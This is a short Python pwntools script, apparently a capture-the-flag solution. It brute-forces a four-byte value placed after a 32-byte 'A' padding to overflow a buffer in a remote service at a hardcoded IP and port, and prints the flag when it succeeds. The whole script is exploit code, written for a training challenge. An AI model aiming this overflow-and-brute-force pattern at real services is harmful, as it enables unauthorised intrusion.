from pwn import *

# Set up the connection


# Start brute forcing
i = 255
iLock = False
j = 255
jLock = False
k = 255
kLock = False
l = 255
lLock = False
while True:
    #conn = process('./acceptance')
    conn = remote('20.169.252.240', 4000)
    response = conn.recvline().decode().strip()
    print(response)
    response = conn.recvn(10).decode().strip()
    print(response)
    payload = b'A'*32 + bytes([i,j,k,l])
    conn.sendline(payload)
    print(payload)
    #responseTWO = conn.recvline().decode().strip()
    responseTWO = response = conn.recvn(34).decode().strip()
    if responseTWO == "You ask a lot and she suspect me :((":  # Too high
        print(f"{i}, {j}, {k}, {l}: accept > 1")
        conn.close()
        if iLock == False:
            i += 1
        elif jLock == False:
            j += 1
        elif kLock == False:
            k += 1
        elif lLock == False:
            l += 1
    elif responseTWO == "Nah, You are a liar!":  # Too low
        print(f"{i}, {j}, {k}, {l}: accept <= -2")
        conn.close()
        if iLock == False:
            i -= 1
            iLock = True
        elif jLock == False:
            j -= 1
            jLock = True
        elif kLock == False:
            k -= 1
            kLock = True
        elif lLock == False:
            l -= 1
            lLock = True
    else:  # Correct
        print(f"{i}, {j}, {k}, {l}: flag: {responseTWO}")
        conn.close()
        exit()
